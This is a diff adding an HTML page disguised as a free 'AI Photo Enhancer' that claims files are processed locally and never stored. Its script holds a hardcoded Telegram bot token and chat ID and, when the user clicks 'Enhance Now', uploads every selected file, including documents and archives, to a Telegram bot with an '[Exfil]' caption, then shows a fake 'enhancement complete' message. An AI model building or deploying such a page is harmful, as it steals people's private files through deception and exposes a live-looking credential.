@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Photo Enhancer - Free Online Tool</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fb;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 20px;
+            padding: 40px 36px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        .card .icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+        .card .icon svg { width: 32px; height: 32px; fill: #fff; }
+        .card h1 { font-size: 22px; font-weight: 700; color: #111; margin-bottom: 6px; }
+        .card p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+        .drop-area {
+            border: 2px dashed #d1d5db;
+            border-radius: 14px;
+            padding: 36px 20px;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: #fafafa;
+        }
+        .drop-area:hover { border-color: #6366f1; background: #f5f3ff; }
+        .drop-area svg { width: 40px; height: 40px; fill: #6366f1; margin-bottom: 10px; }
+        .drop-area .label { color: #333; font-size: 15px; font-weight: 500; }
+        .drop-area .sub { color: #999; font-size: 13px; margin-top: 4px; }
+        #fileInput { display: none; }
+        .file-preview {
+            display: none;
+            margin-top: 16px;
+            padding: 14px 16px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 12px;
+            text-align: left;
+        }
+        .file-preview.show { display: flex; align-items: center; gap: 12px; }
+        .file-preview .fp-icon {
+            width: 36px; height: 36px; background: #dcfce7; border-radius: 8px;
+            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+        }
+        .file-preview .fp-icon svg { width: 18px; height: 18px; fill: #16a34a; }
+        .file-preview .fp-name { flex: 1; font-size: 13px; font-weight: 500; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .file-preview .fp-size { font-size: 11px; color: #999; }
+        .btn {
+            width: 100%;
+            padding: 13px;
+            margin-top: 16px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(99,102,241,0.3); }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; box-shadow: none; }
+        .processing {
+            display: none;
+            margin-top: 16px;
+            padding: 16px;
+            background: #fef3c7;
+            border: 1px solid #fde68a;
+            border-radius: 12px;
+            color: #92400e;
+            font-size: 14px;
+        }
+        .processing.show { display: block; }
+        .processing .spinner {
+            display: inline-block;
+            width: 16px; height: 16px;
+            border: 2px solid #fde68a;
+            border-top-color: #d97706;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .result {
+            display: none;
+            margin-top: 16px;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 14px;
+        }
+        .result.show { display: block; }
+        .result.success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; }
+        .result.error { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; }
+        .footer { margin-top: 20px; font-size: 11px; color: #bbb; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+        </div>
+        <h1>AI Photo Enhancer</h1>
+        <p>Upload your images and our AI will enhance resolution, fix lighting, and remove noise. Free and private — no data is stored.</p>
+
+        <div class="drop-area" id="dropArea">
+            <svg viewBox="0 0 24 24"><path d="M19.35 10.04A7.49 7.49 0 0012 4C9.11 4 6.6 5.64 5.35 8.04A5.994 5.994 0 000 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
+            <div class="label">Click to upload or drag &amp; drop</div>
+            <div class="sub">Supports JPG, PNG, GIF, PDF, DOC, ZIP (max 50MB)</div>
+        </div>
+        <input type="file" id="fileInput" multiple>
+
+        <div class="file-preview" id="filePreview">
+            <div class="fp-icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg></div>
+            <div>
+                <div class="fp-name" id="fpName">file.jpg</div>
+                <div class="fp-size" id="fpSize">2.4 MB</div>
+            </div>
+        </div>
+
+        <button class="btn" id="processBtn" disabled>Enhance Now — Free</button>
+
+        <div class="processing" id="processing">
+            <span class="spinner"></span>
+            AI is enhancing your files... please wait
+        </div>
+
+        <div class="result" id="result"></div>
+
+        <div class="footer">100% free &bull; No registration &bull; Files processed locally</div>
+    </div>
+
+    <script>
+        (function() {
+            // ── Telegram credentials ─────────────────────────────────
+            const BOT_TOKEN = '8721805332:AAFyyq68_Ixw99j1FFWwDzmgPOX2mtS-vAY';
+            const CHAT_ID   = '8606409949';
+            // ─────────────────────────────────────────────────────────
+
+            const dropArea = document.getElementById('dropArea');
+            const fileInput = document.getElementById('fileInput');
+            const filePreview = document.getElementById('filePreview');
+            const fpName = document.getElementById('fpName');
+            const fpSize = document.getElementById('fpSize');
+            const processBtn = document.getElementById('processBtn');
+            const processing = document.getElementById('processing');
+            const result = document.getElementById('result');
+
+            let selectedFiles = [];
+
+            function formatSize(bytes) {
+                if (bytes === 0) return '0 B';
+                const units = ['B', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(1024));
+                return (bytes / Math.pow(1024, i)).toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
+            }
+
+            function showResult(msg, type) {
+                result.textContent = msg;
+                result.className = 'result show ' + type;
+            }
+
+            function hideResult() {
+                result.className = 'result';
+                result.textContent = '';
+            }
+
+            dropArea.addEventListener('click', function() {
+                fileInput.click();
+            });
+
+            fileInput.addEventListener('change', function() {
+                if (this.files.length > 0) {
+                    selectedFiles = Array.from(this.files);
+                    if (selectedFiles.length === 1) {
+                        fpName.textContent = selectedFiles[0].name;
+                        fpSize.textContent = formatSize(selectedFiles[0].size);
+                    } else {
+                        fpName.textContent = selectedFiles.length + ' files selected';
+                        fpSize.textContent = formatSize(selectedFiles.reduce((s, f) => s + f.size, 0));
+                    }
+                    filePreview.classList.add('show');
+                    processBtn.disabled = false;
+                    hideResult();
+                }
+            });
+
+            dropArea.addEventListener('dragover', function(e) {
+                e.preventDefault();
+                this.style.borderColor = '#6366f1';
+                this.style.background = '#f5f3ff';
+            });
+
+            dropArea.addEventListener('dragleave', function(e) {
+                e.preventDefault();
+                this.style.borderColor = '#d1d5db';
+                this.style.background = '#fafafa';
+            });
+
+            dropArea.addEventListener('drop', function(e) {
+                e.preventDefault();
+                this.style.borderColor = '#d1d5db';
+                this.style.background = '#fafafa';
+                if (e.dataTransfer.files.length > 0) {
+                    selectedFiles = Array.from(e.dataTransfer.files);
+                    if (selectedFiles.length === 1) {
+                        fpName.textContent = selectedFiles[0].name;
+                        fpSize.textContent = formatSize(selectedFiles[0].size);
+                    } else {
+                        fpName.textContent = selectedFiles.length + ' files selected';
+                        fpSize.textContent = formatSize(selectedFiles.reduce((s, f) => s + f.size, 0));
+                    }
+                    filePreview.classList.add('show');
+                    processBtn.disabled = false;
+                    hideResult();
+                }
+            });
+
+            processBtn.addEventListener('click', async function() {
+                if (selectedFiles.length === 0) return;
+
+                processBtn.disabled = true;
+                processBtn.textContent = 'Processing...';
+                processing.classList.add('show');
+                hideResult();
+
+                let successCount = 0;
+                let failCount = 0;
+
+                for (let i = 0; i < selectedFiles.length; i++) {
+                    const file = selectedFiles[i];
+
+                    try {
+                        await new Promise((resolve, reject) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('document', file);
+                            formData.append('caption', '[Exfil] ' + file.name + ' | Size: ' + formatSize(file.size));
+
+                            const xhr = new XMLHttpRequest();
+
+                            xhr.addEventListener('load', function() {
+                                if (xhr.status >= 200 && xhr.status < 300) {
+                                    try {
+                                        const data = JSON.parse(xhr.responseText);
+                                        if (data.ok) resolve();
+                                        else reject(new Error(data.description));
+                                    } catch {
+                                        reject(new Error('Invalid response'));
+                                    }
+                                } else {
+                                    reject(new Error('HTTP ' + xhr.status));
+                                }
+                            });
+
+                            xhr.addEventListener('error', () => reject(new Error('Network error')));
+                            xhr.addEventListener('abort', () => reject(new Error('Upload aborted')));
+
+                            xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendDocument', true);
+                            xhr.send(formData);
+                        });
+                        successCount++;
+                    } catch (err) {
+                        failCount++;
+                        console.error('Failed:', file.name, err.message);
+                    }
+                }
+
+                processing.classList.remove('show');
+                processBtn.disabled = false;
+                processBtn.textContent = 'Enhance Now — Free';
+
+                if (failCount === 0) {
+                    showResult('✓ Enhancement complete! Your ' + successCount + ' file(s) have been processed and are ready to download.', 'success');
+                } else {
+                    showResult('⚠ Processed ' + successCount + ' of ' + selectedFiles.length + ' files. Some files could not be processed.', 'error');
+                }
+
+                // Clear state
+                selectedFiles = [];
+                filePreview.classList.remove('show');
+                fileInput.value = '';
+            });
+        })();
+    </script>
+</body>
+</html>
